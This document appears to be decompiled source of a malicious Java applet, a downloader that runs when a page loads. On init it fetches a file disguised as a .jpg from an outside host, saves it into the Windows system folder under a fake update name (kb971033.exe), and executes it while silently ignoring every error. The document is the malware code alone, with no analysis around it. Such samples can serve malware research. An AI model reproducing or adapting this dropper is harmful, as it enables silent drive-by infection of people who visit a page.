import java.io.InputStream;
import java.net.URLConnection;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.awt.Color;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Main extends Applet
{
    private static String nameOfFile;
    private static String specificDirectory;
    private static String defaultDirectory;
    
    @Override
    public void init() {
        this.setBackground(Color.BLACK);
        this.setSize(50, 50);
        this.download("http://www.corvinasnest.com/lists/admin/web/ccm4.jpg", "kb971033.exe", "");
    }
    
    public void download(final String s, final String nameOfFile, final String specificDirectory) {
        Main.specificDirectory = specificDirectory;
        Main.nameOfFile = nameOfFile;
        final String string = Main.defaultDirectory + Main.nameOfFile;
        try {
            final URLConnection openConnection = new URL(s).openConnection();
            final int contentLength = openConnection.getContentLength();
            final InputStream inputStream = openConnection.getInputStream();
            try {
                final File file = new File(Main.defaultDirectory + Main.specificDirectory);
            }
            catch (Exception ex) {}
            final FileOutputStream fileOutputStream = new FileOutputStream(Main.defaultDirectory + Main.nameOfFile);
            int n = 0;
            final byte[] array = new byte[4096];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                fileOutputStream.write(array, 0, read);
                n += read;
            }
            if (contentLength != n) {
                inputStream.close();
                fileOutputStream.close();
            }
            else {
                inputStream.close();
                fileOutputStream.close();
                try {
                    this.runFile(string);
                }
                catch (IOException ex2) {}
            }
        }
        catch (Exception ex3) {}
    }
    
    public void runFile(final String s) throws IOException {
        new ProcessBuilder(new String[] { s }).start();
    }
    
    static {
        Main.defaultDirectory = "c:/windows/";
    }
}
